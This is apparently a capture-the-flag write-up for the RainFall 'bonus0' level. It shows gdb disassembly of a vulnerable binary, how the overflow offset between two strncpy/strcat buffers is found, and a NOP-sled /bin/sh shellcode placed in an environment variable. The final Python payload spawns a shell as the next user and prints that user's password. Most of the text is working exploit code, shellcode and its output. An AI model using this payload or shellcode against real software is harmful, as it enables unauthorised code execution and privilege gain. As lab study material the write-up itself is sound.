### Solution

bonus0@RainFall:~$ (python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x7c\xf8\xff\xbf' + 'A' * 7"; cat -) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA|���AAAAAAA��� AAAAAAAAA|���AAAAAAA���
pwd
/home/user/bonus0
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9


---------------
bonus0@RainFall:~$ ./bonus0 
 - 
hello
 - 
you
hello you
bonus0@RainFall:~$ ./bonus0
 - 
he llo
 - 
you
he llo you

-> wait for 2 inputs and concatenate them

info var
data_start

info function
0x080484b4  p
0x0804851e  pp
0x080485a4  main

```
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:		push   %ebp
   0x080485a5 <+1>:		mov    %esp,%ebp
   0x080485a7 <+3>:		and    $0xfffffff0,%esp
   0x080485aa <+6>:		sub    $0x40,%esp
   0x080485ad <+9>:		lea    0x16(%esp),%eax					; move pointer in esp+22 in eax
   0x080485b1 <+13>:	mov    %eax,(%esp)						; move pointer in esp+22 to esp
   0x080485b4 <+16>:	call   0x804851e <pp>					; call pp with pointer on esp+22 as argument || esp+22 = 0xbffff6f6 = buf
   0x080485b9 <+21>:	lea    0x16(%esp),%eax					; move pointer in esp+22 in eax
   0x080485bd <+25>:	mov    %eax,(%esp)						; move pointer in esp+22 to esp
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>				; call puts with pointer on esp+22 as argument
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    									; return (0)
End of assembler dump.
```

```
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:		push   %ebp
   0x0804851f <+1>:		mov    %esp,%ebp
   0x08048521 <+3>:		push   %edi
   0x08048522 <+4>:		push   %ebx
   0x08048523 <+5>:		sub    $0x50,%esp						; allocate 80 bytes for the local variables
   0x08048526 <+8>:		movl   $0x80486a0,0x4(%esp)				; (gdb) x/s 0x80486a0: " - ", moved to esp+4
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax					; move pointer in ebp-48 to eax || ebp-48 = buf1
>   0x08048531 <+19>:	mov    %eax,(%esp)						; move ebp-48 to esp, buf1 is at 0xbffff6a8
   0x08048534 <+22>:	call   0x80484b4 <p>					; call to p(ebp-48, " - ")
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)				; (gdb) x/s 0x80486a0: " - "
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax					; move pointer in ebp-28 to eax || ebp-28 = buf2
>   0x08048544 <+38>:	mov    %eax,(%esp)						; move eax to esp, buf2 is at 0xbffff6bc
   0x08048547 <+41>:	call   0x80484b4 <p>					; call to p(ebp-28, " - ") || buf2[20]?
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax					; move pointer in ebp-48 to eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)					; move ebp-48 to esp+4
   0x08048553 <+53>:	mov    0x8(%ebp),%eax					; move ebp+0x8 to eax
>   0x08048556 <+56>:	mov    %eax,(%esp)						; move ebp+0x8 to esp || with a breakpoint here, we see that ebp+8 = 0xbffff6f6 = buf
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>			; strcpy(ebp+0x8, ebp-48)
   0x0804855e <+64>:	mov    $0x80486a4,%ebx					; x/s: " " | x/d: 32, moved to ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax					; move ebp+0x8 to eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)			; set the value at ebp-0x3c to 0xffffffff (aka -1)
   0x0804856d <+79>:	mov    %eax,%edx						; move ebp+0x08 to edx
   0x0804856f <+81>:	mov    $0x0,%eax						; set eax to 0
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx					; set ecx to 0xffffffff (-1)
   0x08048577 <+89>:	mov    %edx,%edi						; move ebp+0x08 to edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al				; equivalent to strlen
   0x0804857b <+93>:	mov    %ecx,%eax						;
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax						; eax - 1 (to not count \0?)
   0x08048582 <+100>:	add    0x8(%ebp),%eax					; eax = eax + ebp+0x8 || len + buf
   0x08048585 <+103>:	movzwl (%ebx),%edx						; Move Zero-Extended Word to Long - move ebx to edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax					; move pointer in ebp-28 (buf2) to eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)					; move ebp-28 to esp+4
   0x08048592 <+116>:	mov    0x8(%ebp),%eax					; move ebp+0x8 to eax
   0x08048595 <+119>:	mov    %eax,(%esp)						; move eax to esp
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>			; strcat(ebp+0x8, ebp-28) | strcat(buf, buf2)
   0x0804859d <+127>:	add    $0x50,%esp						; esp = esp+80
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret    
End of assembler dump.
```

buf = 0xbffff6f6
buf1 = 0xbffff6a8
buf2 = 0xbffff6bc

```
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:		push   %ebp
   0x080484b5 <+1>:		mov    %esp,%ebp
   0x080484b7 <+3>:		sub    $0x1018,%esp						; 4120 bytes are allocated for its variable
   0x080484bd <+9>:		mov    0xc(%ebp),%eax					; move ebp+12 to eax (0x80486a0: " - ")
>   0x080484c0 <+12>:	mov    %eax,(%esp)						; move ebp+12 to esp
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>				; puts(ebp+12)
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)				; move 4096 to esp+8
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax				; move pointer in ebp-4104 to eax, 0xbfffe670? new buffer?-> after, "hello" is stored there
>   0x080484d6 <+34>:	mov    %eax,0x4(%esp)					; move ebp-4104 to esp+4, 0xbfffe670?
   0x080484da <+38>:	movl   $0x0,(%esp)						; move 0 to esp
   0x080484e1 <+45>:	call   0x8048380 <read@plt>				; read(0, ebp-4104, 4096)
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)					; move 10 to esp+4
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax				; move pointer in ebp-4104 to eax
   0x080484f4 <+64>:	mov    %eax,(%esp)						; move ebp-4104 to esp
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>			; strchr(ebp-4104, 10)
   0x080484fc <+72>:	movb   $0x0,(%eax)						; set eax = return value of strchr to 0
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax				; move pointer in ebp-4104 to eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)					; move 20 to esp+8
>   0x0804850d <+89>:	mov    %eax,0x4(%esp)					; move ebp-4104 to esp+4, 0xbfffe670: "hello", and "you" after second read
   0x08048511 <+93>:	mov    0x8(%ebp),%eax					; move ebp+8 to eax
>   0x08048514 <+96>:	mov    %eax,(%esp)						; move ebp+8 to esp, 0xbffff6a8 = buf1, after 2nd read: 0xbffff6bc = buf2
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>			; strncpy(ebp+8, ebp-4104, 20)
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
```


(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()

-> the 2nd input cause a segfault - Offset is 9
The buffer is only 20 chars, so we only have 11 bytes available to inject a shellcode, which is not enough.

Let's save our shellcode in an env variable:
shellcode: '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars

The actual address of the shellcode must be known ahead of time, which can be difficult to know in a dynamically changing stack.
By creating a large array (or sled) of these NOP instructions and placing it before the shellcode, if the EIP returns to any address found in the NOP sled, the EIP will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP will slide down the sled to the shellcode, which will execute properly.

```
export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
```
$> gdb bonus0
(gdb) break main
Breakpoint 1 at 0x80485a7
(gdb) run
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/s *((char **)environ)
0xbffff86c:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"


the beginning of our NOP + shellcode is at address 0xbffff86c
-> we have to choose an address that contains a NOP (\x90), so that it will sled into the beginning of our shellcode and execute it

(gdb) x/12wx 0xbffff86c
0xbffff86c:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xbffff87c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff88c:	0x90909090	0x90909090	0x90909090	0x90909090

-> let's pick 0xbffff87c

(python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x7c\xf8\xff\xbf' + 'A' * 7"; cat -) | ./bonus0

// 4095 + \n = 4096, to fill the buf3, \n because of the strchr(buf3, '\n')
// 'A' * 9 because the offset of the 2nd input that causes the segfault is 9
// address of the shellcode (4 bytes)
// 'A' * 7, so that we have 20 bytes for buf2 (9 + 4 + 7).


// source:
// https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x270-stackoverflow.html
// x/s *((char **)environ) to get address of env variables